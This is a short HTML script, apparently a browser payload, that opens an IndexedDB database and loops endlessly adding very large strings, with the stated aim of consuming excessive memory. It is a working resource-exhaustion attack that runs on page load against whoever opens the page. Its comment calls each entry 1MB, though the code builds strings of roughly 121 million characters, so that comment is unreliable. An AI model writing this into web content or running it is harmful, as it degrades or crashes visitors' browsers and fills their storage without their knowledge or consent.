<script>
// Function to consume excessive memory with IndexedDB
var request = indexedDB.open('myDatabase'); // Opens an IndexedDB connection

request.onupgradeneeded = function(event) {
    var db = event.target.result;
    var objectStore = db.createObjectStore('store', { autoIncrement: true });

    while (true) {
        try {
            objectStore.add({ data: 'x'.repeat(11024 * 11024) }); // Adds a 1MB entry to IndexedDB
        } catch (e) {
            console.error("Error adding entry to IndexedDB:", e); // Displays any errors in the console
            break;
        }
    }
};
</script>
